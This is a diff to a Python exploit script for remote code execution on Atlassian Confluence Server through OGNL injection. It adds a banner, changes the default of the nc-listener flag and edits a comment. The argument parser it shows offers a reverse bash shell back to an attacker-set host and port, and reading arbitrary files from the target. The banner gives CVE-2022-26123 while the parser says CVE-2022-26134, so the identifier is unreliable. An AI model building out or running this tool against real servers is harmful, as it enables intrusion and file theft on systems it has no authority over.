@@ -18,8 +18,11 @@ import os
 
 urllib3.disable_warnings()
 
-        
+def do_banner():
+    print("Exploit for CVE-2022-26123: Confluence Namespace OGNL Injection")
+
 if __name__ == "__main__":
+    do_banner()
     
     parser = argparse.ArgumentParser(description='Atlassian Confluence Server exploit (CVE-2022-26134)')
     parser.add_argument('--rhost', action="store", dest="rhost", required=True, help="The remote address to exploit")
@@ -28,7 +31,7 @@ if __name__ == "__main__":
     parser.add_argument('--lport', action="store", dest="lport", type=int, help="The local port to connect back to", default=1270)
     parser.add_argument('--protocol', action="store", dest="protocol", help="The protocol handler to use", default="https://")
     parser.add_argument('--reverse-shell', action="store_true", dest="reverse_shell", default=False, help="Execute a bash shell")
-    parser.add_argument('--fork-nc', action="store_true", dest="fork_nc", default=True, help="Directs the program to start an nc listener")
+    parser.add_argument('--fork-nc', action="store_true", dest="fork_nc", default=False, help="Directs the program to start an nc listener")  # Changed default to False
     parser.add_argument('--nc-path', action="store", dest="ncpath", help="The path to nc", default="/usr/bin/nc")
     parser.add_argument('--read-file', action="store", dest="read_file", help="From memory, read the provided file")
     args = parser.parse_args()
@@ -39,7 +42,7 @@ if __name__ == "__main__":
     
     if not args.reverse_shell and not args.read_file:
         print("[-] User selected neither reverse shell nor read file. One must be selected.")
-        sys.exit(1)  # Added exit for this condition to prevent proceeding
+        sys.exit(1)
 
     if not args.fork_nc:
         print("[!] User has opted not to fork nc")
